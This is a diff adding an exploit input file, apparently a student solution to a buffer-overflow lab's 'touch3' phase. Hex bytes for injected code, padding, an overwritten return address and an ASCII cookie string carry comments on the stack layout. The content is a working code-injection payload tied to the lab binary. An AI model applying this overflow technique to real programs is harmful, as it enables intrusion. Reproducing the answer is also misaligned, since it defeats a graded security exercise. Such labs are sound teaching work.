@@ -1,0 +1,19 @@
+/* padding 0x28 = 40 spaces plus disassembled code move to %rsp+0x10 
+    %rsp point to the return address and we consumed 8 bytes 
+    to store the address (%rsp-0x28) to exec the mov xxx %rdi 
+    to setup the parameter, yet another 8 bytes to store the 
+    touch3 address, thus, we overflow further more, to store 
+    the needed string there, therefore, 16 bytes above the %rsp, 
+    16 is decimal, convert it to hex which is 0x10
+*/
+48 c7 c7 d0 dc 02 55 c3 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+/* shift back stack pointer i.e. %rsp - 0x28 */
+98 dc 02 55 00 00 00 00 
+/* target_f3 w/ little endian */
+e6 17 40 00 00 00 00 00 
+/* convert $0x1cf2157f to ascii hex rep */
+31 63 66 32 31 35 37 66 00
